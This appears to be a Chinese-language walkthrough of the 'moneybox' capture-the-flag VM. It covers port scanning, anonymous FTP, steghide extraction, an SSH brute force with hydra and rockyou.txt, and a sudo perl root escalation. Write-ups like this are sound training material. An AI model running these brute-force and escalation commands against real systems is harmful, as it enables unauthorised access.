靶机2（moneybox）

分类：
标签：

日期：2024-01-07 21:40:00

VirtualBox-5.2.28-130011-Win.exe.zip

网络仅主机，USB选1.1

靶场下载：moneybox


先ifdown eth0 关闭eth0 然后开启ifup eth0 地址变成192.168.56.xx就行了


检查一下靶机是否成功，访问为下面样子就行了

端口扫描，获得端口和对应的服务
:::warning

nmap -p- 192.168.56.102

:::

指定端口号，启用脚本扫描
:::warning

nmap -p 21,22,80 -sC 192.168.56.102

:::
发现ftp拥有允许匿名ftp登录的漏洞，Anonymous:Anonymous登录


下载文件

没发现任何信息，尝试看看二进制文件
:::warning

strings trytofind.jpg

:::

一般图片不会有这些奇奇怪怪的东西，说明有问题

查看trytofind,jpg
:::warning

steghide info trytofind.jpg

:::
需要密钥

访问后发现没有

开始目录扫描，发现blogs，访问http://192.168.56.102/blogs/
:::warning

dirsearch -u 192.168.56.102 -x 403,404

:::

提示你新的目录

访问S3cr3t-T3xt
view-source:192.168.56.102/S3cr3t-T3xt/
获得key，尝试对trytofind.jpg进行分离
:::warning

steghide extract -sf trytofind.jpg

:::
需要密钥试试获得的key发现就是
成功分离出一个data.txt，得到一个用户名renu

我告诉你一件很重要的事。你的密码太短了，所以改一下吧！不要低估它……
说明renu密码可能是弱密码

得到了一个用户名可以尝试爆破，爆破出密码为987654321
:::warning

hydra -L user.txt -P rockyou.txt 192.168.56.102 ssh

:::

举例：

登录renu账号，得到flag
:::warning

ssh renu@192.168.56.102

:::

获得一个用户账号可以从其下手试试其他的，查一下历史记录

根据历史命令判断，当前renu账户可以通过ssh免密登录lily账户
:::warning
cat .bash_history
:::

登录后发现新的flag

然后想办法提权
sudo -l 得到几个可以提权的文件命令

可以sudo来运行perl
在https://gtfobins.github.io/#中找需要的命令
:::warning

sudo perl -e ‘exec “/bin/bash”;’

:::
拿到root的flag文件
